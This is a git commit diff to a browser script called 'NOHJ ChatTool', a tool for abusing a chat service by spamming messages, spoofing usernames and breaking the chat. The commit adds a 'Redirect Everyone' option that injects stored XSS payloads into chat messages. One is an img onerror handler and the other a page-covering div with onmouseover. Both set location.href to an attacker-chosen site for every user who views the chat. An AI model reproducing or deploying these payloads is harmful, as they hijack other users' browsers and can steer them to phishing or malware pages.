a067f3deb562c6c0b213ff3b38122468b35de106
zastix <69748767+ZasticBradyn@users.noreply.github.com>
2022-04-13 17:44:07 -0500

    xss exploit aded

--- script.js
+++ script.js
@@ -3,7 +3,7 @@ alert("NOHJ ChatTool\n\ncoded by zastix")
 alert("Press ' \\' to open the UI")
 window.addEventListener("keydown", function(e) {
         if (e.key == `\\`) {
-            switch(Number(prompt("What would you like to do\n\nSpam - 1\nSpoof Username - 2\nChat-Breaker - 3\n\nMore soon!"))) {
+            switch(Number(prompt("What would you like to do\n\nSpam - 1\nSpoof Username - 2\nChat-Breaker - 3\nReidrect Everyone - 4\n\nMore soon!"))) {
                 case 1:
                     window.userraw = prompt("What username would you like to use")
                     window.message = prompt("What would you like to say.\n\nPress '.' to change this")
@@ -27,7 +27,7 @@ window.addEventListener("keydown", function(e) {
                           socket2.emit('chat message', {
                             message: window.message,
                             user: window.userraw
-                          }, 50)
+                          })
                     });
                     break;
                 case 2:
@@ -44,6 +44,22 @@ window.addEventListener("keydown", function(e) {
                           })
                           }, 1000)
                     break;
+                case 4:
+                    let site = prompt("What site would you like to redirect the user to?\n\nExample: https://zastix.xyz/")
+                    switch (Number(prompt("What method of XSS?\n\nIMG onError - 1\nDiv onhover - 2"))) {
+                        case 1:
+                            socket2.emit('chat message', {
+                                message: `<img src="e.png" onerror="location.href='${site}'">`,
+                                user: ''
+                            })
+                            break;
+                        case 2:
+                            socket2.emit('chat message', {
+                                message: `<div style="transform:translate(-50%,-20%);width:10000px;height:10000px;background-color:black;position:absolute;" onmouseover=location.href="${site}">`,
+                                user: ''
+                            })
+                            break;
+                    }
             }
         }
     })
